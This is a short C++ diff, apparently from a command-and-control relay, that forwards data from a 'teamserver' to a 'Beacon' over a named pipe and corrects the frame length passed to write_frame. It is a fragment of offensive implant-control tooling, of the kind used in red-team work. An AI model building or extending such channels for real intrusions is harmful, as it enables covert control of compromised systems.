@@ -435,10 +435,12 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 		char * dataForBeacon = reinterpret_cast<char*>(dataFromTeamserver.data());
 
 		/* write to our named pipe Beacon */
-		write_frame(handle_beacon, dataForBeacon, read);
+		//write_frame(handle_beacon, dataForBeacon, read);
+		write_frame(handle_beacon, dataForBeacon, dataFromTeamserver.size());
 
 		//sleep & wait for beacon to do something
 		Sleep(10000);
+		//exit after comms
 	}
 }
 
